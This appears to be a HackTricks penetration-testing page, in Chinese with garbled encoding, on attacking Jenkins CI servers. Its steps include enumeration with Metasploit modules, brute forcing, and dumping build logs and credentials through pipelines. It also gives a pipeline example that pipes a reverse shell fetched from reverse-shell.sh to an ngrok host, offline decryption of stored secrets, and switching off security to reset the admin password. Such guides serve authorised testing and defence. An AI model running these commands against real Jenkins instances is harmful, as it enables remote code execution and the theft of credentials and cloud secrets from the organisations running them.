# Jenkins Security

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

Jenkins æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥å»ºç«‹å‡ ä¹**ä»»ä½•**ç¼–ç¨‹è¯­è¨€å’Œæºä»£ç åº“çš„**æŒç»­é›†æˆ**æˆ–**æŒç»­äº¤ä»˜**ï¼ˆCI/CDï¼‰ç¯å¢ƒï¼Œä½¿ç”¨æµæ°´çº¿ã€‚æ­¤å¤–ï¼Œå®ƒè‡ªåŠ¨åŒ–äº†å„ç§å¸¸è§„å¼€å‘ä»»åŠ¡ã€‚è™½ç„¶ Jenkins å¹¶æ²¡æœ‰æ¶ˆé™¤**ä¸ºå„ä¸ªæ­¥éª¤åˆ›å»ºè„šæœ¬çš„éœ€è¦**ï¼Œä½†å®ƒç¡®å®æä¾›äº†ä¸€ç§æ¯”æ‰‹åŠ¨æ„å»ºæ›´å¿«ã€æ›´å¼ºå¤§çš„æ–¹å¼æ¥é›†æˆæ•´ä¸ªæ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²å·¥å…·é“¾ã€‚

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## æœªè®¤è¯æšä¸¾

ä¸ºäº†åœ¨æ²¡æœ‰è®¤è¯çš„æƒ…å†µä¸‹æœç´¢æœ‰è¶£çš„ Jenkins é¡µé¢ï¼ˆå¦‚ _/people_ æˆ– _/asynchPeople_ï¼Œè¿™ä¼šåˆ—å‡ºå½“å‰ç”¨æˆ·ï¼‰ï¼Œä½ å¯ä»¥ä½¿ç”¨ï¼š
```
msf> use auxiliary/scanner/http/jenkins_enum
```
æ£€æŸ¥æ˜¯å¦å¯ä»¥åœ¨ä¸éœ€è¦èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ï¼š
```
msf> use auxiliary/scanner/http/jenkins_command
```
æ²¡æœ‰å‡­è¯çš„æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥æŸ¥çœ‹ _**/asynchPeople/**_ è·¯å¾„æˆ– _**/securityRealm/user/admin/search/index?q=**_ ä»¥è·å– **ç”¨æˆ·å**ã€‚

ä½ å¯ä»¥ä»è·¯å¾„ _**/oops**_ æˆ– _**/error**_ è·å– Jenkins ç‰ˆæœ¬ã€‚

![](<../../.gitbook/assets/image (146).png>)

### å·²çŸ¥æ¼æ´

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ç™»å½•

åœ¨åŸºæœ¬ä¿¡æ¯ä¸­ï¼Œä½ å¯ä»¥æŸ¥çœ‹ **æ‰€æœ‰ç™»å½• Jenkins çš„æ–¹å¼**ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### æ³¨å†Œ

ä½ å¯ä»¥æ‰¾åˆ°å…è®¸ä½  **åˆ›å»ºè´¦æˆ·å¹¶ç™»å½•** çš„ Jenkins å®ä¾‹ã€‚å°±è¿™ä¹ˆç®€å•ã€‚

### **SSO ç™»å½•**

å¦‚æœå­˜åœ¨ **SSO** **åŠŸèƒ½**/**æ’ä»¶**ï¼Œä½ åº”è¯¥å°è¯•ä½¿ç”¨æµ‹è¯•è´¦æˆ·ï¼ˆä¾‹å¦‚ï¼Œæµ‹è¯• **Github/Bitbucket è´¦æˆ·**ï¼‰**ç™»å½•**åº”ç”¨ç¨‹åºã€‚æŠ€å·§æ¥è‡ª[**è¿™é‡Œ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)ã€‚

### æš´åŠ›ç ´è§£

**Jenkins** ç¼ºä¹ **å¯†ç ç­–ç•¥** å’Œ **ç”¨æˆ·åæš´åŠ›ç ´è§£ç¼“è§£æªæ–½**ã€‚å¯¹ç”¨æˆ·è¿›è¡Œ **æš´åŠ›ç ´è§£** æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå¯èƒ½å­˜åœ¨ **å¼±å¯†ç ** æˆ– **ç”¨æˆ·åä½œä¸ºå¯†ç ** çš„æƒ…å†µï¼Œç”šè‡³æ˜¯ **åè½¬ç”¨æˆ·åä½œä¸ºå¯†ç **ã€‚
```
msf> use auxiliary/scanner/http/jenkins_login
```
### å¯†ç å–·æ´’

ä½¿ç”¨[è¿™ä¸ª python è„šæœ¬](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py)æˆ–[è¿™ä¸ª powershell è„šæœ¬](https://github.com/chryzsh/JenkinsPasswordSpray)ã€‚

### IP ç™½åå•ç»•è¿‡

è®¸å¤šç»„ç»‡å°† **SaaS-based source control management (SCM) systems**ï¼ˆå¦‚ GitHub æˆ– GitLabï¼‰ä¸ **internal, self-hosted CI** è§£å†³æ–¹æ¡ˆï¼ˆå¦‚ Jenkins æˆ– TeamCityï¼‰ç»“åˆä½¿ç”¨ã€‚è¿™ç§è®¾ç½®å…è®¸ CI ç³»ç»Ÿ **æ¥æ”¶æ¥è‡ª SaaS source control vendors çš„ webhook äº‹ä»¶**ï¼Œä¸»è¦ç”¨äºè§¦å‘æµæ°´çº¿ä½œä¸šã€‚

ä¸ºå®ç°è¿™ä¸€ç‚¹ï¼Œç»„ç»‡ä¼šå°† **SCM å¹³å°çš„ IP èŒƒå›´**åˆ—å…¥ **ç™½åå•**ï¼Œå…è®¸å®ƒä»¬é€šè¿‡ **webhooks** è®¿é—® **internal CI system**ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œ**ä»»ä½•äºº**éƒ½å¯ä»¥åœ¨ GitHub æˆ– GitLab ä¸Šåˆ›å»ºä¸€ä¸ª **è´¦æˆ·**ï¼Œå¹¶å°†å…¶é…ç½®ä¸º **è§¦å‘ webhook**ï¼Œå¯èƒ½ä¼šå‘ **internal CI system** å‘é€è¯·æ±‚ã€‚

å‚è€ƒ: [shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## å†…éƒ¨ Jenkins æ»¥ç”¨

åœ¨è¿™äº›åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å‡è®¾ä½ æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„è´¦æˆ·å¯ä»¥è®¿é—® Jenkinsã€‚

{% hint style="warning" %}
æ ¹æ® Jenkins ä¸­é…ç½®çš„ **Authorization** æœºåˆ¶å’Œè¢«æ”»é™·ç”¨æˆ·çš„æƒé™ï¼Œä½  **å¯èƒ½èƒ½å¤Ÿæˆ–ä¸èƒ½æ‰§è¡Œä»¥ä¸‹æ”»å‡»ã€‚**
{% endhint %}

æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### åˆ—å‡ºç”¨æˆ·

å¦‚æœä½ å·²ç»è®¿é—®äº† Jenkinsï¼Œä½ å¯ä»¥åœ¨ [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) åˆ—å‡ºå…¶ä»–æ³¨å†Œç”¨æˆ·ã€‚

### è½¬å‚¨æ„å»ºä»¥æŸ¥æ‰¾æ˜æ–‡ç§˜å¯†

ä½¿ç”¨[è¿™ä¸ªè„šæœ¬](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py)è½¬å‚¨æ„å»ºæ§åˆ¶å°è¾“å‡ºå’Œæ„å»ºç¯å¢ƒå˜é‡ï¼Œå¸Œæœ›èƒ½æ‰¾åˆ°æ˜æ–‡ç§˜å¯†ã€‚
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **çªƒå– SSH å‡­è¯**

å¦‚æœè¢«æ”»é™·çš„ç”¨æˆ·**æœ‰è¶³å¤Ÿçš„æƒé™åˆ›å»º/ä¿®æ”¹æ–°çš„ Jenkins èŠ‚ç‚¹**ï¼Œå¹¶ä¸”å·²ç»å­˜å‚¨äº†è®¿é—®å…¶ä»–èŠ‚ç‚¹çš„ SSH å‡­è¯ï¼Œä»–å¯ä»¥é€šè¿‡åˆ›å»º/ä¿®æ”¹èŠ‚ç‚¹å¹¶**è®¾ç½®ä¸€ä¸ªè®°å½•å‡­è¯çš„ä¸»æœº**æ¥**çªƒå–è¿™äº›å‡­è¯**ï¼Œè€Œæ— éœ€éªŒè¯ä¸»æœºå¯†é’¥ï¼š

![](<../../.gitbook/assets/image (218).png>)

ä½ é€šå¸¸ä¼šåœ¨**å…¨å±€æä¾›è€…** (`/credentials/`) ä¸­æ‰¾åˆ° Jenkins çš„ ssh å‡­è¯ï¼Œå› æ­¤ä½ ä¹Ÿå¯ä»¥åƒè½¬å‚¨å…¶ä»–ç§˜å¯†ä¸€æ ·è½¬å‚¨å®ƒä»¬ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§[**è½¬å‚¨ç§˜å¯†éƒ¨åˆ†**](./#dumping-secrets)ã€‚

### **Jenkins ä¸­çš„ RCE**

åœ¨ Jenkins æœåŠ¡å™¨ä¸Šè·å–**shell**ï¼Œæ”»å‡»è€…å¯ä»¥æ³„éœ²æ‰€æœ‰çš„**ç§˜å¯†**å’Œ**ç¯å¢ƒå˜é‡**ï¼Œå¹¶**åˆ©ç”¨åŒä¸€ç½‘ç»œä¸­çš„å…¶ä»–æœºå™¨**ï¼Œç”šè‡³**æ”¶é›†äº‘å‡­è¯**ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒJenkins å°†**ä»¥ SYSTEM èº«ä»½è¿è¡Œ**ã€‚å› æ­¤ï¼Œæ”»é™·å®ƒå°†ä½¿æ”»å‡»è€…è·å¾—**SYSTEM æƒé™**ã€‚

### **é€šè¿‡åˆ›å»º/ä¿®æ”¹é¡¹ç›®å®ç° RCE**

åˆ›å»º/ä¿®æ”¹é¡¹ç›®æ˜¯ä¸€ç§åœ¨ Jenkins æœåŠ¡å™¨ä¸Šè·å¾— RCE çš„æ–¹æ³•ï¼š

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **é€šè¿‡æ‰§è¡Œ Groovy è„šæœ¬å®ç° RCE**

ä½ ä¹Ÿå¯ä»¥é€šè¿‡æ‰§è¡Œ Groovy è„šæœ¬è·å¾— RCEï¼Œè¿™å¯èƒ½æ¯”åˆ›å»ºæ–°é¡¹ç›®æ›´éšè”½ï¼š

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### é€šè¿‡åˆ›å»º/ä¿®æ”¹ Pipeline å®ç° RCE

ä½ ä¹Ÿå¯ä»¥é€šè¿‡**åˆ›å»º/ä¿®æ”¹ pipeline**è·å¾— RCEï¼š

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline åˆ©ç”¨

è¦åˆ©ç”¨ pipelinesï¼Œä½ ä»ç„¶éœ€è¦è®¿é—® Jenkinsã€‚

### æ„å»º Pipelines

**Pipelines** ä¹Ÿå¯ä»¥ç”¨ä½œ**é¡¹ç›®ä¸­çš„æ„å»ºæœºåˆ¶**ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é…ç½®ä¸€ä¸ª**å­˜å‚¨åœ¨ä»“åº“ä¸­çš„æ–‡ä»¶**ï¼Œè¯¥æ–‡ä»¶å°†åŒ…å« pipeline è¯­æ³•ã€‚é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ `/Jenkinsfile`ï¼š

![](<../../.gitbook/assets/image (127).png>)

ä¹Ÿå¯ä»¥**å°† pipeline é…ç½®æ–‡ä»¶å­˜å‚¨åœ¨å…¶ä»–åœ°æ–¹**ï¼ˆä¾‹å¦‚åœ¨å…¶ä»–ä»“åº“ä¸­ï¼‰ï¼Œç›®çš„æ˜¯**åˆ†ç¦»**ä»“åº“**è®¿é—®**å’Œ pipeline è®¿é—®ã€‚

å¦‚æœæ”»å‡»è€…å¯¹è¯¥æ–‡ä»¶æœ‰**å†™å…¥æƒé™**ï¼Œä»–å°†èƒ½å¤Ÿ**ä¿®æ”¹**å®ƒå¹¶**å¯èƒ½è§¦å‘** pipelineï¼Œè€Œæ— éœ€è®¿é—® Jenkinsã€‚\
æ”»å‡»è€…å¯èƒ½éœ€è¦**ç»•è¿‡ä¸€äº›åˆ†æ”¯ä¿æŠ¤**ï¼ˆå–å†³äºå¹³å°å’Œç”¨æˆ·æƒé™ï¼Œå¯èƒ½ä¼šè¢«ç»•è¿‡æˆ–æ— æ³•ç»•è¿‡ï¼‰ã€‚

æ‰§è¡Œè‡ªå®šä¹‰ pipeline çš„æœ€å¸¸è§è§¦å‘å™¨æ˜¯ï¼š

* **Pull request** åˆ°ä¸»åˆ†æ”¯ï¼ˆæˆ–å¯èƒ½åˆ°å…¶ä»–åˆ†æ”¯ï¼‰
* **Push åˆ°ä¸»åˆ†æ”¯**ï¼ˆæˆ–å¯èƒ½åˆ°å…¶ä»–åˆ†æ”¯ï¼‰
* **æ›´æ–°ä¸»åˆ†æ”¯**å¹¶ç­‰å¾…å…¶ä»¥æŸç§æ–¹å¼æ‰§è¡Œ

{% hint style="info" %}
å¦‚æœä½ æ˜¯**å¤–éƒ¨ç”¨æˆ·**ï¼Œä½ ä¸åº”è¯¥æœŸæœ›åˆ›å»ºä¸€ä¸ª**PR åˆ°å…¶ä»–ç”¨æˆ·/ç»„ç»‡çš„ä¸»åˆ†æ”¯**å¹¶**è§¦å‘ pipeline**... ä½†å¦‚æœé…ç½®ä¸å½“ï¼Œä½ å¯èƒ½ä¼šé€šè¿‡åˆ©ç”¨è¿™ä¸€ç‚¹**å®Œå…¨æ”»é™·å…¬å¸**ã€‚
{% endhint %}

### Pipeline RCE

åœ¨å‰é¢çš„ RCE éƒ¨åˆ†ä¸­ï¼Œå·²ç»æŒ‡å‡ºäº†ä¸€ç§[**é€šè¿‡ä¿®æ”¹ pipeline è·å¾— RCE**](./#rce-creating-modifying-pipeline)çš„æŠ€æœ¯ã€‚

### æ£€æŸ¥ç¯å¢ƒå˜é‡

å¯ä»¥ä¸ºæ•´ä¸ª pipeline æˆ–ç‰¹å®šé˜¶æ®µå£°æ˜**æ˜æ–‡ç¯å¢ƒå˜é‡**ã€‚è¿™äº›ç¯å¢ƒå˜é‡**ä¸åº”åŒ…å«æ•æ„Ÿä¿¡æ¯**ï¼Œä½†æ”»å‡»è€…æ€»æ˜¯å¯ä»¥**æ£€æŸ¥æ‰€æœ‰ pipeline** é…ç½®/Jenkinsfilesï¼š
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

æœ‰å…³ Jenkins é€šå¸¸å¦‚ä½•å¤„ç† secrets çš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Credentials å¯ä»¥ **å…¨å±€æä¾›è€…èŒƒå›´** (`/credentials/`) æˆ– **ç‰¹å®šé¡¹ç›®èŒƒå›´** (`/job/<project-name>/configure`)ã€‚å› æ­¤ï¼Œä¸ºäº†æå–æ‰€æœ‰çš„ credentialsï¼Œä½ éœ€è¦ **è‡³å°‘æ”»ç ´æ‰€æœ‰åŒ…å« secrets çš„é¡¹ç›®** å¹¶æ‰§è¡Œè‡ªå®šä¹‰/æ¶æ„ç®¡é“ã€‚

è¿˜æœ‰å¦ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºäº†åœ¨ç®¡é“çš„ **env ä¸­è·å– secret**ï¼Œä½ éœ€è¦ **çŸ¥é“ secret çš„åç§°å’Œç±»å‹**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ å°è¯•å°† **`usernamePassword`** **secret** ä½œä¸º **`string`** **secret** åŠ è½½ï¼Œä½ ä¼šå¾—åˆ°è¿™ä¸ª **é”™è¯¯**ï¼š
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
è¿™é‡Œæœ‰ä¸€äº›å¸¸è§çš„ç§˜å¯†ç±»å‹çš„åŠ è½½æ–¹å¼ï¼š
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
åœ¨æœ¬é¡µæœ«å°¾ä½ å¯ä»¥**æ‰¾åˆ°æ‰€æœ‰çš„å‡­è¯ç±»å‹**ï¼š[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**ä¸€æ¬¡æ€§è½¬å‚¨æ‰€æœ‰ç§˜å¯†**çš„æœ€ä½³æ–¹æ³•æ˜¯**æ”»é™·** **Jenkins** æœºå™¨ï¼ˆä¾‹å¦‚åœ¨**å†…ç½®èŠ‚ç‚¹**ä¸Šè¿è¡Œåå‘ shellï¼‰ï¼Œç„¶å**æ³„éœ²** **ä¸»å¯†é’¥**å’Œ**åŠ å¯†çš„ç§˜å¯†**å¹¶ç¦»çº¿è§£å¯†å®ƒä»¬ã€‚\
æ›´å¤šå…³äºå¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹çš„ä¿¡æ¯ï¼Œè¯·å‚è§[èŠ‚ç‚¹å’Œä»£ç†éƒ¨åˆ†](./#nodes-and-agents)å’Œ[åæœŸåˆ©ç”¨éƒ¨åˆ†](./#post-exploitation)ã€‚
{% endhint %}

### è§¦å‘å™¨

æ¥è‡ª[æ–‡æ¡£](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ï¼š`triggers` æŒ‡ä»¤å®šä¹‰äº†**é‡æ–°è§¦å‘ Pipeline çš„è‡ªåŠ¨åŒ–æ–¹å¼**ã€‚å¯¹äºä¸ GitHub æˆ– BitBucket ç­‰æºé›†æˆçš„ Pipelineï¼Œ`triggers` å¯èƒ½ä¸æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºåŸºäº webhooks çš„é›†æˆå¯èƒ½å·²ç»å­˜åœ¨ã€‚ç›®å‰å¯ç”¨çš„è§¦å‘å™¨æœ‰ `cron`ã€`pollSCM` å’Œ `upstream`ã€‚

Cron ç¤ºä¾‹ï¼š
```bash
triggers { cron('H */4 * * 1-5') }
```
æŸ¥çœ‹**æ–‡æ¡£ä¸­çš„å…¶ä»–ç¤ºä¾‹**ã€‚

### Nodes & Agents

ä¸€ä¸ª**Jenkinså®ä¾‹**å¯èƒ½åœ¨**ä¸åŒçš„æœºå™¨ä¸Šè¿è¡Œä¸åŒçš„agents**ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè®¿é—®ä¸åŒçš„æœºå™¨æ„å‘³ç€å¯ä»¥**çªƒå–ä¸åŒçš„æ½œåœ¨äº‘å‡­è¯**æˆ–**ä¸åŒçš„ç½‘ç»œè®¿é—®æƒé™**ï¼Œè¿™äº›éƒ½å¯ä»¥è¢«æ»¥ç”¨æ¥æ”»å‡»å…¶ä»–æœºå™¨ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

ä½ å¯ä»¥åœ¨ `/computer/` æšä¸¾**é…ç½®çš„èŠ‚ç‚¹**ï¼Œé€šå¸¸ä½ ä¼šå‘ç°**`Built-In Node`**ï¼ˆå³è¿è¡ŒJenkinsçš„èŠ‚ç‚¹ï¼‰ä»¥åŠå¯èƒ½æ›´å¤šçš„èŠ‚ç‚¹ï¼š

![](<../../.gitbook/assets/image (249).png>)

**ç‰¹åˆ«æœ‰è¶£çš„æ˜¯æ”»é™·Built-InèŠ‚ç‚¹**ï¼Œå› ä¸ºå®ƒåŒ…å«æ•æ„Ÿçš„Jenkinsä¿¡æ¯ã€‚

è¦æŒ‡ç¤ºä½ å¸Œæœ›åœ¨**å†…ç½®JenkinsèŠ‚ç‚¹**ä¸Š**è¿è¡Œ** **pipeline**ï¼Œå¯ä»¥åœ¨pipelineä¸­æŒ‡å®šä»¥ä¸‹é…ç½®ï¼š
```bash
pipeline {
agent {label 'built-in'}
```
### å®Œæ•´ç¤ºä¾‹

åœ¨ç‰¹å®šä»£ç†ä¸­çš„æµæ°´çº¿ï¼Œå¸¦æœ‰cronè§¦å‘å™¨ï¼Œå…·æœ‰æµæ°´çº¿å’Œé˜¶æ®µç¯å¢ƒå˜é‡ï¼Œåœ¨æ­¥éª¤ä¸­åŠ è½½2ä¸ªå˜é‡å¹¶å‘é€åå‘shellï¼š
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## åæ¸—é€

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

ä½ å¯ä»¥é€šè¿‡è®¿é—® `/credentials/` åˆ—å‡º secretsï¼Œå¦‚æœä½ æœ‰è¶³å¤Ÿçš„æƒé™ã€‚è¯·æ³¨æ„ï¼Œè¿™åªä¼šåˆ—å‡º `credentials.xml` æ–‡ä»¶ä¸­çš„ secretsï¼Œä½†**æ„å»ºé…ç½®æ–‡ä»¶**ä¸­å¯èƒ½è¿˜æœ‰**æ›´å¤šçš„å‡­è¯**ã€‚

å¦‚æœä½ èƒ½**æŸ¥çœ‹æ¯ä¸ªé¡¹ç›®çš„é…ç½®**ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨å…¶ä¸­çœ‹åˆ°ç”¨äºè®¿é—®å­˜å‚¨åº“çš„**å‡­è¯ï¼ˆsecretsï¼‰åç§°**å’Œ**é¡¹ç›®çš„å…¶ä»–å‡­è¯**ã€‚

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

è¿™äº›æ–‡ä»¶æ˜¯**è§£å¯† Jenkins secrets**æ‰€éœ€çš„ï¼š

* secrets/master.key
* secrets/hudson.util.Secret

è¿™äº›**secrets é€šå¸¸å¯ä»¥åœ¨ä»¥ä¸‹æ–‡ä»¶ä¸­æ‰¾åˆ°**ï¼š

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

è¿™æ˜¯ä¸€ä¸ªç”¨äºæŸ¥æ‰¾å®ƒä»¬çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### ç¦»çº¿è§£å¯† Jenkins secrets

å¦‚æœä½ å·²ç»è·å–äº†è§£å¯† secrets æ‰€éœ€çš„**å¯†ç **ï¼Œä½¿ç”¨[**è¿™ä¸ªè„šæœ¬**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **æ¥è§£å¯†è¿™äº› secrets**ã€‚
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### ä» Groovy è§£å¯† Jenkins secrets
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ç”¨æˆ·

1. è®¿é—® Jenkins çš„ config.xml æ–‡ä»¶ï¼Œè·¯å¾„ä¸º `/var/lib/jenkins/config.xml` æˆ– `C:\Program Files (x86)\Jenkins\`
2. æœç´¢ `<useSecurity>true</useSecurity>` å¹¶å°† **`true`** æ”¹ä¸º **`false`**ã€‚
   1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **é‡å¯** **Jenkins** æœåŠ¡å™¨ï¼š`service jenkins restart`
4. ç°åœ¨å†æ¬¡è®¿é—® Jenkins é—¨æˆ·ï¼Œè¿™æ¬¡ **Jenkins ä¸ä¼šè¦æ±‚ä»»ä½•å‡­æ®**ã€‚å¯¼èˆªåˆ° "**Manage Jenkins**" é‡æ–°è®¾ç½® **ç®¡ç†å‘˜å¯†ç **ã€‚
5. é€šè¿‡å°†è®¾ç½®æ”¹å› `<useSecurity>true</useSecurity>` **å†æ¬¡å¯ç”¨** **å®‰å…¨æ€§**ï¼Œå¹¶ **å†æ¬¡é‡å¯ Jenkins**ã€‚

## å‚è€ƒèµ„æ–™

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

